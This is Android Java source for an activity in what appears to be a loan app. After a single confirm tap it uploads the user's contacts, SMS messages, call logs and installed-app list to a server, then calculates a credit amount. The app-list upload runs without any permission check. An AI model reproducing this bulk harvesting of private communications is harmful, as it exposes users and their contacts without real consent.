package com.lemontree.android.ui.activity;

import android.Manifest;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Handler;
import android.os.Looper;
import android.view.View;

import androidx.core.app.ActivityCompat;

import com.google.gson.Gson;
import com.lemontree.android.R;
import com.lemontree.android.base.BaseActivity;
import com.lemontree.android.base.BaseResponseBean;
import com.lemontree.android.bean.request.CommonReqBean;
import com.lemontree.android.bean.response.GetBankListResBean;
import com.lemontree.android.manager.BaseApplication;
import com.lemontree.android.manager.ConstantValue;
import com.lemontree.android.manager.NetConstantValue;
import com.lemontree.android.network.OKHttpClientEngine;
import com.lemontree.android.uploadUtil.Permission;
import com.lemontree.android.uploadUtil.UploadDataBySingle;
import com.lemontree.android.uploadUtil.UploadNecessaryData;
import com.lemontree.android.utils.IntentUtils;
import com.minchainx.permission.util.PermissionListener;
import com.networklite.NetworkLiteHelper;
import com.networklite.callback.GenericCallback;

import okhttp3.Call;

public class InfoGetReadyActivity extends BaseActivity {

    private boolean mHasUploadAddressBook;
    private boolean mHasUpdateSmsSuccess;
    private boolean mHasUpdateAppListSuccess;
    private boolean mHasUpdateCallLogSuccess;

    public static Intent createIntent(Context context) {
        return new Intent(context, InfoGetReadyActivity.class);
    }

    @Override
    protected int getLayoutResId() {
        return R.layout.activity_info_get_ready;
    }

    @Override
    protected void initializeView() {
        findViewById(R.id.btn_confirm).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                //打开信息确认页
                uploadSomeInfo();
            }
        });
    }

    @Override
    protected void loadData() {
    }

    private void uploadSomeInfo() {
        new Permission(mContext, new String[]{
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_PHONE_STATE,//包含READ_CALL_LOG
                Manifest.permission.READ_SMS
        }, new PermissionListener() {
            @Override
            public void onGranted() {
                uploadAccordingPermissions();
            }

            @Override
            public void onDenied() {
                uploadAccordingPermissions();
            }
        });
    }

    private void uploadAccordingPermissions() {
        if (isGetNecessaryPermission()) {
            uploadNecessaryData();
        }
        //sms
        if (isGetSMSPermission()) {
            if (!mHasUpdateSmsSuccess) {
                uploadSmsOnly();
            }
        }
        //call record
        if (isGetCallLogPermission()) {
            if (!mHasUpdateCallLogSuccess) {
                uploadCallRecordOnly();
            }
        }
        //app list
        if (!mHasUpdateAppListSuccess) {
            uploadAppListOnly();
        }
    }

    private boolean isGetNecessaryPermission() {
        return ActivityCompat.checkSelfPermission(mContext, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED
                && ActivityCompat.checkSelfPermission(mContext, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED;
    }

    private boolean isGetSMSPermission() {
        return ActivityCompat.checkSelfPermission(mContext, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED;
    }

    private boolean isGetCallLogPermission() {
        return ActivityCompat.checkSelfPermission(mContext, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED;
    }

    /**
     * 上传数据
     */
    private void uploadNecessaryData() {
        final ProgressDialog dialog = new ProgressDialog(mContext);
        dialog.setMessage(getString(R.string.dialog_loading));
        if (!mContext.isFinishing()) {
            dialog.show();
        }
        new UploadNecessaryData().upload(BaseApplication.mUserId, new UploadNecessaryData.UploadDataListener() {
            @Override
            public void success() {
                new Handler(Looper.getMainLooper()).post(new Runnable() {
                    @Override
                    public void run() {
                        dialog.dismiss();
//                        调用/app/order/calculationAmt，普通入参
                        calculateAmount();
                    }
                });
            }

            @Override
            public void error() {

                new Handler(Looper.getMainLooper()).post(new Runnable() {
                    @Override
                    public void run() {
                        dialog.dismiss();
                    }
                });
            }
        });
    }

    /**
     * 上传短信
     */
    private void uploadSmsOnly() {
        new UploadDataBySingle().uploadSms(BaseApplication.mUserId, new UploadDataBySingle.UploadSmsListener() {
            @Override
            public void success() {
                mHasUpdateSmsSuccess = true;
            }

            @Override
            public void error() {
            }
        });
    }

    /**
     * 上传通话记录
     */
    private void uploadCallRecordOnly() {
        new UploadDataBySingle().uploadCallRecord(BaseApplication.mUserId, new UploadDataBySingle.UploadCallRecordListener() {
            @Override
            public void success() {
                mHasUpdateCallLogSuccess = true;
            }

            @Override
            public void error() {
            }
        });
    }

    /**
     * 上传app list
     */
    private void uploadAppListOnly() {
        new UploadDataBySingle().uploadAppList(BaseApplication.mUserId, new UploadDataBySingle.UploadAppListListener() {
            @Override
            public void success() {
                mHasUpdateAppListSuccess = true;
            }

            @Override
            public void error() {
            }
        });
    }

    /**
     * 计算额度
     */
    private void calculateAmount() {
        NetworkLiteHelper
                .postJson()
                .url(NetConstantValue.BASE_HOST + ConstantValue.CALCULATE_AMOUNT)
                .content(new Gson().toJson(new CommonReqBean()))
                .build()
                .execute(OKHttpClientEngine.getNetworkClient(), new GenericCallback<GetBankListResBean>() {
                    @Override
                    public void onSuccess(Call call, GetBankListResBean response, int id) {
                        if (response != null && BaseResponseBean.SUCCESS.equals(response.res_code)) {
                            IntentUtils.gotoMainActivity(mContext, MainActivity.TAB_HOME);
                            finishActivity();
                        }
                    }

                    @Override
                    public void onFailure(Call call, Exception exception, int id) {
                    }
                });
    }
}
